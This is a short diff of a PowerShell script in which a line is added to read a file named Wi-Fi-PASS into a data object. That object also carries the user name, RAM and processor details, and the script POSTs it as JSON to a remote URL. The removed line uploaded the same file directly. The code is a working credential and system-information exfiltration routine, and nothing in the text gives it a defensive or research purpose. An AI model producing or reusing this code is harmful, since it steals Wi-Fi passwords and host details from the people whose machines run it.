@@ -15,8 +15,8 @@ $data = @{
     "User" = $c.Name
     "Ram" = $q
     "İşlemci" = $p
+    "Wifi Password" = Get-Content -Path Wi-Fi-PASS
 }
 
 $jsonData = $data | ConvertTo-Json
 Invoke-RestMethod -Uri $e -Method Post -Body $jsonData -ContentType "application/json"
-powershell Invoke-WebRequest -Uri $e -Method POST -InFile Wi-Fi-PASS
